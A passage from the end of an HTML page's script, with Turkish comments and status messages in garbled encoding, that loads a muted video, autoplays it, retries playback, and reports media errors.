                    updateStatus('Video metadata yÃ¼klendi: ' + video.videoWidth + 'x' + video.videoHeight);
                    video.volume = 0;
                    video.muted = true;
                });
                
                video.addEventListener('loadeddata', () => {
                    updateStatus('Video verisi yÃ¼klendi');
                    video.play().then(() => {
                        updateStatus('Video oynatÄ±lÄ±yor');
                    }).catch(err => {
                        updateStatus('Video oynatÄ±lamadÄ±: ' + err.message);
                        console.error('Video oynatÄ±lamadÄ±:', err);
                    });
                });
                
                video.addEventListener('canplay', () => {
                    updateStatus('Video oynatÄ±lmaya hazÄ±r');
                    video.volume = 0;
                    video.muted = true;
                    video.play().then(() => {
                        updateStatus('Video oynatÄ±lÄ±yor');
                    }).catch(err => {
                        updateStatus('Video oynatÄ±lamadÄ±: ' + err.message);
                        console.error('Video oynatÄ±lamadÄ±:', err);
                    });
                });
                
                video.addEventListener('playing', () => {
                    updateStatus('Video oynatÄ±lÄ±yor âœ“');
                });
                
                // Hata kontrolÃ¼
                video.addEventListener('error', (e) => {
                    let errorMsg = 'Video yÃ¼kleme hatasÄ±: ';
                    if (video.error) {
                        const errorCodes = {
                            1: 'MEDIA_ERR_ABORTED - YÃ¼kleme iptal edildi',
                            2: 'MEDIA_ERR_NETWORK - AÄŸ hatasÄ±',
                            3: 'MEDIA_ERR_DECODE - Kod Ã§Ã¶zme hatasÄ±',
                            4: 'MEDIA_ERR_SRC_NOT_SUPPORTED - Format desteklenmiyor'
                        };
                        errorMsg += errorCodes[video.error.code] || 'Bilinmeyen hata';
                        errorMsg += ' (' + video.error.message + ')';
                    } else {
                        errorMsg += 'Dosya bulunamadÄ± veya format desteklenmiyor';
                    }
                    updateStatus(errorMsg);
                    console.error('Video yÃ¼kleme hatasÄ±:', e);
                    console.error('Video error code:', video.error ? video.error.code : 'bilinmiyor');
                    console.error('Video error message:', video.error ? video.error.message : 'bilinmiyor');
                });
                
                // Ses deÄŸiÅŸikliklerini dinle ve her zaman kapalÄ± tut
                video.addEventListener('volumechange', () => {
                    if (video.volume > 0) {
                        video.volume = 0;
                    }
                    if (!video.muted) {
                        video.muted = true;
                    }
                });
                
                // Video yÃ¼klemeyi zorla
                video.load();
                
                // Hemen oynatmayÄ± dene
                setTimeout(() => {
                    updateStatus('Video durumu kontrol ediliyor... (readyState: ' + video.readyState + ')');
                    if (video.readyState >= 2) {
                        video.play().then(() => {
                            updateStatus('Video oynatÄ±lÄ±yor');
                        }).catch(err => {
                            updateStatus('Ä°lk oynatma denemesi baÅŸarÄ±sÄ±z: ' + err.message);
                            console.error('Ä°lk oynatma denemesi baÅŸarÄ±sÄ±z:', err);
                        });
                    } else {
                        updateStatus('Video henÃ¼z hazÄ±r deÄŸil (readyState: ' + video.readyState + ')');
                    }
                }, 100);
                
                // 2 saniye sonra tekrar dene
                setTimeout(() => {
                    if (video.readyState === 0) {
                        console.log('Video hala yÃ¼klenmedi, tekrar deneniyor...');
                        video.load();
                    }
                    // Ses seviyesini tekrar kontrol et
                    video.volume = 0;
                    video.muted = true;
                    // Tekrar oynatmayÄ± dene
                    if (video.readyState >= 2) {
                        video.play().catch(err => {
                            console.error('Ä°kinci oynatma denemesi baÅŸarÄ±sÄ±z:', err);
                        });
                    }
                }, 2000);
            }
        });
    </script>
</body>
</html>
